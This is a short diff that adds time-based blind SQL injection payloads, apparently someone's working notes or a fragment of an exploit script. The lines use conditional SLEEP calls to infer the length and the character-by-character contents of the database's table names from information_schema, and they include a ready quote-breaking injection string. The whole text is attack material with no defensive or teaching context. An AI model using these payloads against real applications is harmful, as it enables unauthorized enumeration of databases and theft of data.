@@ -1,0 +1,8 @@
+if(select length(group_concat(table_name) from information_schema.tables where table_schema=database())=4,1,sleep(3))
+(SELECT CASE WHEN"+ " ( Ascii( SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()) FROM "+ m +" FOR 1))="+i+")"+ " THEN SLEEP(4) ELSE SLEEP(0) END )
+
+select group_concat(table_name) from information_schema.tables where table_schema=database()
+
+case when 1=1 then sleep(3) end
+
+a' or case when ((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=14) then sleep(3) else sleep(0) end and 'b'='b
